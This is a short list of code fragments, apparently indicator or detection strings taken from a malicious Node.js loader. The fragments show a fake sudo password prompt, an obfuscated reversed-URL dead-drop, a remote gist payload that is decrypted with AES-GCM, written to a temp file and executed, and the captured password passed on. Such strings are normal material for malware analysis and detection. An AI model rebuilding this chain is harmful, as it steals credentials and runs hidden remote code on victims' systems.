Password for ${user}:
spawnSync('sudo', ['-S', '-v', '-k']
dGk3dzM4dHl0NDhmX3hvbGJvci9zL2VtLnQvLzpzcHR0aA==
await fetchText(gistUrl)
createDecipheriv('aes-256-gcm'
fs.writeFileSync(tempFile, decrypted)
spawn(process.execPath, [tempFile]
GHOST_PWD: capturedPassword